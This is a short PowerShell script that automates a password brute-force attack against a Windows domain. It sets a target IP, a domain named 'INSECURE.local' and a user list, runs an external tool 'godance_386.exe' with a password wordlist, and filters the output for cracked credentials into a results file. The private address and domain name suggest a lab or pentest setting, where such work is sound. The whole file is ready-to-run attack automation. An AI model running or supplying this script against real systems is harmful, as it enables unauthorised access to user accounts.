<#

1) Set Variables

powershell $global:target="192.168.80.50"
powershell $global:domain = "INSECURE.local"
powershell $global:userlist = "users.txt"
#

2) run the script 

./brute_godance_password.ps1

#>

#$global:target=$args[0]

function run-godance {

date 



#password
.\godance_386.exe -d $domain -u $userlist -w pass_password.txt -h $target
Get-Content .\godance_brute_password.txt | findstr "In hacker voice" | sort-object| Get-Unique > godance_brute_password_cracked.txt



date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content .\godance_brute_password_cracked.txt
}
# Run 


#if ($target) { 
run-godance | Tee godance_brute_password.txt
#} else {
#Write-Host "USEAGE: " 
#Write-Host "	./godance-brute.ps1 [IP ADDRESS]" 
#Write-Host "" 
#Write-Host "" 
#}



